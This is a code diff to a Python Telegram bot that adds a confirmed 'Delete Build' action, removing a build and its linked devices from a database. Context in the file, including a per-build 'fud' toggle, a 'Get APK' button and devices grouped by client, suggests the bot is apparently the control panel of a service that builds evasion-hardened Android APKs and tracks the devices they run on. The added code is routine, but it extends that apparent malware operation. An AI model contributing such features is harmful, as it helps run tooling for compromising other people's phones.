@@ -1304,6 +1304,8 @@ def kb_build_detail(build_id: int, client_id: int,
         fud_label, callback_data=f"toggle_build_fud_{build_id}"))
     kb.add(types.InlineKeyboardButton(
         "📥 Get APK", callback_data=f"get_apk_{build_id}"))
+    kb.add(types.InlineKeyboardButton(
+        "🗑 Delete Build", callback_data=f"delete_build_confirm_{build_id}_{client_id}"))
     kb.add(
         types.InlineKeyboardButton(
             "🔙 Back",
@@ -5531,6 +5533,36 @@ def handle_callback(call):
 
     elif data.startswith("builds_history_"):
         show_builds_history(chat_id, msg_id, int(data.split("_")[2]))
+
+    elif data.startswith("delete_build_confirm_"):
+        parts    = data.split("_")
+        build_id  = int(parts[3])
+        client_id = int(parts[4])
+        kb = types.InlineKeyboardMarkup(row_width=2)
+        kb.add(
+            types.InlineKeyboardButton("✅ Yes, Delete", callback_data=f"delete_build_do_{build_id}_{client_id}"),
+            types.InlineKeyboardButton("❌ Cancel",      callback_data=f"build_detail_{build_id}"),
+        )
+        safe_edit(chat_id, msg_id,
+                  "🗑 <b>Delete Build?</b>\n"
+                  "━━━━━━━━━━━━━━━━━━━━\n"
+                  "This will permanently delete this build record and all its devices.\n"
+                  "Are you sure?",
+                  kb)
+
+    elif data.startswith("delete_build_do_"):
+        parts     = data.split("_")
+        build_id  = int(parts[3])
+        client_id = int(parts[4])
+        try:
+            db = get_db()
+            db.execute("DELETE FROM devices WHERE build_id=?", (build_id,))
+            db.execute("DELETE FROM builds WHERE id=?", (build_id,))
+            db.commit()
+            db.close()
+            show_builds_history(chat_id, msg_id, client_id)
+        except Exception as e:
+            safe_edit(chat_id, msg_id, f"❌ Delete failed: {e}", None)
 
     elif data.startswith("build_detail_"):
         show_build_detail(chat_id, msg_id, int(data.split("_")[2]))
